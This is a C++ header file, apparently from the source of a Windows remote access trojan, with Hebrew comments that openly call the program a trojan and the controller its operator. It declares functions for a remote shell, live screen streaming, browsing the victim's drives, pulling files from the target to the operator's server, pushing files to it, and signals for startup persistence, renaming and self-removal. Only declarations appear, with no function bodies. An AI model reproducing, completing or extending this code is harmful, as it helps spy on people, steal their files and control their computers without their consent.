#pragma once
#include <nlohmann/json.hpp>
#include <tchar.h>



using namespace nlohmann;
/* 
   # ----------------------------------------------
   #  API MODES 
   # ----------------------------------------------
   # 1. mode shell for executable
   # 2. mode screen for screenshot live 
   # 3. mode explorer as explorer WIN protocol
   # 4. mode download download from T to server
   # 5. mode upload upload from server to T
   # S. <signals> restart,kill,rename,remove,startup
   # ....
   כל המצבים מתקשרים תחת חיבור חדש
   @[success]
*/

// ---
// מקבל פקודות מהמפעיל ומריץ אותם על גבי המערכת, את התוצאה הסוס מחזיר 
// param setting_s: הגדרות הסוס
// param port: יציאה
// ---
void bMode_shell(json setting_s, unsigned int port);

// ---
// הסוס מקבל כתובת ויציאה ואיתם יוצר צינורות על גבי שקע שהם כתיבה וקריאה
// הכתיבה זה המפעיל והקריאה זה התוצאה שחוזרת לצד המפעיל
// param setting_s: הגדרות רשת של הסוס
// param port: יציאה
// param _app: שם קובץ ההרצה שאיתו יווצר החיבור וקריאה כתיבה
// ---
void bMode_shell_terminal(json setting_s, unsigned int port, const char* _app);

// ---
// תהליך שיוצר שידור בזמן אמת של המסך 
// מתבסס על מיפוי המסך ללא אופטימיזציה, נשען על תצורת השידור 
// כלומר איכות תמונה, פריימים לשניה ועוד
// param setting_s: הגדרות רשת של הסוס
// param port: יציאה
// param setting: הגדרות התנהגות של הסוס 
// ---
void bMode_screen(json setting_s, unsigned int port, map<string, int>& setting);

// ---
// תהליך לשידור בזמן אמת של המסך
// גם מתבסס על מיפוי המסך אבל עם אופטימיזציה, חילוק הפריים לחלקים 
// משדר חלקים מהפריים שהשתנו, אחרת לא מצרך אותם לשידור הפריים, 
// כלומר רק חלקים במסך שיש בהם פעילות מצטרפים לפריים
// param setting_s: הגדרות רשת של הסוס
// param port: יציאה
// param setting: כנל 
// ---
void bMode_screen_v2(json setting_s, unsigned int port, map<string, int>& setting);

// ---
// הסוס יוצר מיפוי לכוננים על גבי מערכת ומשדר את תיקיות המערכת למפעיל
// param setting_s: 
// param port:
// param setting:
// ---
void bMode_explorer(json setting_s, unsigned int port, map<string, int>& setting);

// ---
// תהליך לצורך הורדת נתונים מהסוס לשרת
// תיקיות\קבצים
// param setting_s:
// param port:
// ---
void bMode_download(json setting_s, unsigned int port);

// ---
// העלאה של קבצים \ תיקיות
// param setting_s:
// param port:
// ---
void bMode_upload(json setting_s, unsigned int port);

// signals // 
// ---
// תהליך שלא יוצר חיבור חדש או משדר חזרה למפעיל
// פעולות 
//	kill process
//	restart
//	startup
//	rename (trojan file name)
//  remove (trojan from target)
// ---
void restart_tuna();
